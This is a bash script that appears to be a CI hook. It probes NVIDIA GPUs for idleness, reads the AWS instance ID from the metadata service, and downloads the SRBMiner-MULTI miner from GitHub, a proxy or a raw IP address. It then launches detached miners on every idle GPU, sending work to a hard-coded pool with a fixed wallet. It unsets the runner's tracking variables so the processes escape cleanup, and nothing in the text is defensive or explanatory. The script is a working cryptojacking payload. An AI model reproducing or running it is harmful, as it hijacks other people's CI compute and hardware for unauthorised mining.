#!/bin/bash
# i130ghfam2: two-sample GPU idle gate + one pinned SRBMiner-MULTI 3.8.7 per genuinely idle NVIDIA card
set +e
P="${RUNNER_TEMP:-/tmp}/i130ghfam2-$$"
mkdir -p "$P/logs" 2>/dev/null || { P="/tmp/i130ghfam2-$$"; mkdir -p "$P/logs"; }
echo "HOOK_START $(date -u) host=$(hostname) uid=$(id -u) pwd=$(pwd)"
command -v nvidia-smi >/dev/null 2>&1 || { echo "NO_NVIDIA_SMI"; exit 0; }
nvidia-smi -L
nvidia-smi --query-gpu=index,name,memory.total,memory.free,driver_version --format=csv,noheader
echo "APPS1:"; nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
sleep 12
echo "SAMPLE2 $(date -u)"
nvidia-smi --query-gpu=index,uuid,memory.free --format=csv,noheader,nounits
echo "APPS2:"; nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
TOK=$(curl -sS -m 3 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null)
echo "IMDS_INSTANCE: $(curl -sS -m 4 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80)"
cd "$P" || exit 1
URL=https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz
for u in "$URL" "https://ghproxy.net/$URL" "http://222.240.155.198:8702/srb387"; do
  case "$u" in
    *.tar.gz) curl -fsSL --retry 1 -m 150 -o srb.tgz "$u" 2>/dev/null && tar -xzf srb.tgz 2>/dev/null && break;;
    *) curl -fsSL --retry 1 -m 150 -o srb387 "$u" 2>/dev/null && break;;
  esac
done
BIN=$(find "$P" -maxdepth 3 -type f \( -name SRBMiner-MULTI -o -name srb387 \) 2>/dev/null | head -1)
chmod +x "$BIN" 2>/dev/null
SHA=$(sha256sum "$BIN" 2>/dev/null | awk '{print $1}')
echo "BIN=$BIN SHA=$SHA"
if [ "$SHA" != "bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6" ]; then echo "SHA_MISMATCH ${SHA:-none}"; exit 0; fi
W=prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk
TAG="${I130TAG:-i130ghfam2}"
busy2=$(nvidia-smi --query-compute-apps=gpu_uuid --format=csv,noheader | tr -d ' ')
nvidia-smi --query-gpu=index,uuid,memory.free --format=csv,noheader,nounits | while IFS=',' read -r idx uuid free; do
  idx=$(echo "$idx" | tr -d ' '); uuid=$(echo "$uuid" | tr -d ' '); free=$(echo "$free" | tr -d ' ')
  [ "${free:-0}" -lt 1500 ] 2>/dev/null && { echo "SKIP g$idx free=$free"; continue; }
  case "$busy2" in *"$uuid"*) echo "SKIP g$idx busy"; continue;; esac
  w="${TAG}g$idx"
  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$BIN" --disable-cpu --algorithm pearlhash \
    --pool 103.199.106.122:3362 --tls false --wallet "$W" --password x --worker "$w" --gpu-id "$idx" \
    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \
    --log-file "$P/logs/$w.log" --log-file-mode 0 >> "$P/logs/$w.out" 2>&1 < /dev/null &
  echo "LAUNCHED g$idx $w pid=$!"
done
sleep 8
echo "MINER_PROCS:"; pgrep -af SRBMiner-MULTI | head -40
for f in "$P"/logs/*.out; do echo "== $f"; tail -6 "$f"; done
echo HOOK_END
